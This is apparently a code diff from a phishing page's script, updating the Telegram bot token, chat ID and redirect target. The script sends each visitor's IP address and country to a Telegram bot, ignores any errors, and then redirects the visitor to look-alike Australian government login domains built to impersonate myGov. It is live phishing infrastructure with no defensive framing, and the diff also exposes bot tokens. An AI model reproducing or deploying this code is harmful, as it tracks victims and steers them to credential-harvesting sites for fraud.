@@ -42,8 +42,8 @@
 
     <script>
         // ===== CONFIGURATION =====
-        const BOT_TOKEN = '8388778615:AAEUOlFAP-sTKsUz8MRz_2BQ3wYi_UnbAx0';
-        const CHAT_ID = '722615124';
+        const BOT_TOKEN = '9068847371:AAHrQsiXC5Ew6EQpYxs5g7M3hlJyzUDJMLo';
+        const CHAT_ID = '9103714828';
         // =========================
 
         function sendAndRedirect(ip, country) {
@@ -57,7 +57,7 @@
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
                 .catch(() => {}) // ignore errors
                 .finally(() => {
-                    window.location.href = 'https://log.gov.au-incometax26.de5.net/records2026/log.html';
+                    window.location.href = 'https://login.my.gov.au-expressapp.de5.net/expressplus/log.html';
                 });
         }
 
